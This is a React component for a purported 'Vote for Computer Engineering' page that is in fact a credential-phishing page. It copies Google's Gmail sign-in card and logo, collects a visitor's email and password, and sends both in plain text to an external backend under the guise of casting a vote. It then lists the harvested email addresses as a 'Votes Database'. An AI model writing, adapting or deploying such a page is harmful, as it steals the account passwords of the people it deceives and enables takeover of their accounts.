import React, { useState, useEffect } from 'react';
import { Vote, VoteResponse } from '../types';

// Use environment variable for backend, fallback to deployed Render URL
const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://votingsystem-tqdk.onrender.com';

const VotingSystem: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [password, setPassword] = useState<string>('');
  const [votes, setVotes] = useState<Vote[]>([]);
  const [loading, setLoading] = useState<boolean>(false);

  useEffect(() => {
    fetchVotes();
  }, []);

  const fetchVotes = async (): Promise<void> => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/votes`);
      const data: Vote[] = await response.json();
      setVotes(data);
    } catch (error) {
      console.error('Error fetching votes:', error);
      alert('Unable to fetch votes from server.');
    }
  };

  const handleNext = (): void => {
    if (!email.trim()) {
      alert('Please enter your email or phone');
      return;
    }
    setShowPassword(true);
  };

  const handleSignIn = async (): Promise<void> => {
    if (!password.trim()) {
      alert('Please enter your password');
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(`${BACKEND_URL}/api/vote`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data: VoteResponse = await response.json();

      if (response.ok) {
        alert('Thank you for voting. Vote again');
        setEmail('');
        setPassword('');
        setShowPassword(false);
        fetchVotes();
      } else {
        alert(data.message || 'Error submitting vote');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error connecting to server');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-indigo-950 via-purple-950 to-slate-950">
      {/* Animated Particles Background */}
      <div className="absolute inset-0">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute w-2 h-2 bg-blue-400 rounded-full opacity-30"
            style={{
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              animation: `float ${5 + Math.random() * 10}s linear infinite`,
              animationDelay: `${Math.random() * 5}s`,
            }}
          />
        ))}
      </div>

      {/* Geometric Shapes */}
      <div className="absolute inset-0 overflow-hidden opacity-10">
        <div className="absolute top-20 left-10 w-72 h-72 border-2 border-cyan-400 rounded-full animate-spin-slow"></div>
        <div className="absolute bottom-20 right-10 w-96 h-96 border-2 border-purple-400 rotate-45 animate-pulse-slow"></div>
        <div className="absolute top-1/2 left-1/3 w-64 h-64 border-2 border-pink-400 rounded-lg animate-bounce-slow"></div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 min-h-screen flex flex-col">
        {/* Header Section */}
        <header className="w-full px-4 py-8 md:py-12">
          <div className="max-w-6xl mx-auto text-center">
            <div className="inline-block mb-4 px-6 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full">
              <span className="text-white text-sm font-semibold tracking-wider">OFFICIAL VOTING</span>
            </div>
            <h1 className="text-3xl sm:text-4xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400 mb-4 leading-tight">
              Vote for Computer Engineering
            </h1>
            <div className="flex items-center justify-center gap-2 text-lg sm:text-xl md:text-2xl text-blue-300 font-medium">
              <svg className="w-5 h-5 md:w-6 md:h-6" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"
                  clipRule="evenodd"
                />
              </svg>
              Cavite, Philippines
            </div>
          </div>
        </header>

        {/* Main Content Area */}
        <main className="flex-1 flex items-center justify-center px-4 pb-8">
          <div className="w-full max-w-md">
            {/* Gmail Sign-in Card */}
            <div className="bg-white/10 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/20 p-6 sm:p-8 md:p-10">
              {/* Google Logo with Glow */}
              <div className="flex justify-center mb-6">
                <div className="p-4 bg-white rounded-2xl shadow-lg shadow-blue-500/50">
                  <svg className="w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16" viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                  </svg>
                </div>
              </div>

              {/* Title */}
              <div className="text-center mb-8">
                <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Sign in</h2>
                <p className="text-sm text-blue-200">to continue to Gmail</p>
              </div>

              {/* Form */}
              {!showPassword ? (
                <div className="space-y-6">
                  <input
                    type="text"
                    value={email}
                    onChange={(e: React.ChangeEvent<HTMLInputElement>) => setEmail(e.target.value)}
                    placeholder="Email or phone"
                    className="w-full px-4 py-4 bg-white/20 backdrop-blur-sm border-2 border-white/30 rounded-xl text-white placeholder-white/60 focus:outline-none focus:border-cyan-400 focus:bg-white/25 transition-all text-sm sm:text-base"
                    onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleNext()}
                  />

                  <p className="text-xs sm:text-sm text-blue-200 leading-relaxed">
                    Not your computer? Use Guest mode to sign in privately.{' '}
                    <a href="#" className="text-cyan-300 hover:text-cyan-200 font-medium underline">
                      Learn more
                    </a>
                  </p>

                  <div className="flex justify-end pt-2">
                    <button
                      onClick={handleNext}
                      className="px-8 py-3 bg-gradient-to-r from-cyan-500 to-blue-500 text-white rounded-xl hover:from-cyan-600 hover:to-blue-600 font-semibold shadow-lg shadow-cyan-500/50 transition-all transform hover:scale-105 text-sm sm:text-base"
                    >
                      Next →
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex items-center gap-3 p-4 bg-white/20 backdrop-blur-sm border-2 border-white/30 rounded-xl">
                    <div className="w-10 h-10 bg-gradient-to-br from-cyan-400 to-blue-500 rounded-full flex items-center justify-center">
                      <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"/>
                      </svg>
                    </div>
                    <span className="text-sm sm:text-base text-white font-medium truncate">{email}</span>
                  </div>

                  <input
                    type="password"
                    value={password}
                    onChange={(e: React.ChangeEvent<HTMLInputElement>) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    className="w-full px-4 py-4 bg-white/20 backdrop-blur-sm border-2 border-white/30 rounded-xl text-white placeholder-white/60 focus:outline-none focus:border-cyan-400 focus:bg-white/25 transition-all text-sm sm:text-base"
                    onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleSignIn()}
                    disabled={loading}
                  />

                  <div className="flex justify-between items-center pt-2">
                    <button
                      onClick={() => setShowPassword(false)}
                      className="text-sm text-blue-200 hover:text-white transition-colors"
                      disabled={loading}
                    >
                      ← Back
                    </button>
                    <button
                      onClick={handleSignIn}
                      disabled={loading}
                      className={`px-8 py-3 bg-gradient-to-r from-cyan-500 to-blue-500 text-white rounded-xl font-semibold shadow-lg shadow-cyan-500/50 transition-all transform hover:scale-105 text-sm sm:text-base ${
                        loading ? 'opacity-50 cursor-not-allowed' : 'hover:from-cyan-600 hover:to-blue-600'
                      }`}
                    >
                      {loading ? 'Signing in...' : 'Sign in →'}
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Note Badge */}
            <div className="mt-8 text-center">
              <div className="inline-flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-purple-500/30 to-pink-500/30 backdrop-blur-md rounded-full border border-purple-400/50">
                <svg className="w-5 h-5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z"/>
                </svg>
                <span className="text-white text-sm sm:text-base font-medium">Note: 1 vote per Gmail account</span>
              </div>
            </div>
          </div>
        </main>

        {/* Votes Dashboard */}
        {votes.length > 0 && (
          <div className="relative z-10 w-full px-4 pb-8">
            <div className="max-w-6xl mx-auto">
              <div className="bg-white/10 backdrop-blur-xl rounded-3xl border border-white/20 p-4 sm:p-6 md:p-8">
                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 gap-4">
                  <h3 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-3">
                    <div className="w-10 h-10 bg-gradient-to-br from-cyan-400 to-blue-500 rounded-lg flex items-center justify-center">
                      <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/>
                      </svg>
                    </div>
                    Votes Database
                  </h3>
                  <div className="px-6 py-2 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full">
                    <span className="text-white font-bold text-sm sm:text-base">Total: {votes.length} votes</span>
                  </div>
                </div>

                <div className="space-y-3 max-h-96 overflow-y-auto custom-scrollbar">
                  {votes.map((vote: Vote, index: number) => (
                    <div
                      key={index}
                      className="flex flex-col sm:flex-row sm:items-center sm:justify-between p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/20 hover:bg-white/15 transition-all gap-2"
                    >
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 bg-gradient-to-br from-purple-400 to-pink-500 rounded-full flex items-center justify-center flex-shrink-0">
                          <span className="text-white text-xs font-bold">{index + 1}</span>
                        </div>
                        <span className="text-sm sm:text-base font-medium text-white truncate">{vote.email}</span>
                      </div>
                      <span className="text-xs sm:text-sm text-blue-300 pl-11 sm:pl-0">{new Date(vote.timestamp).toLocaleString()}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Custom Styles */}
      <style>{`
        @keyframes float { 0%,100%{ transform:translateY(0px); }50%{ transform:translateY(-20px); } }
        .animate-spin-slow { animation: spin 20s linear infinite; }
        .animate-pulse-slow { animation: pulse 4s cubic-bezier(0.4,0,0.6,1) infinite; }
        .animate-bounce-slow { animation: bounce 3s infinite; }
        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255,255,255,0.1); border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: linear-gradient(to bottom, #06b6d4,#3b82f6); border-radius:10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: linear-gradient(to bottom,#0891b2,#2563eb); }
      `}</style>
    </div>
  );
};

export default VotingSystem;
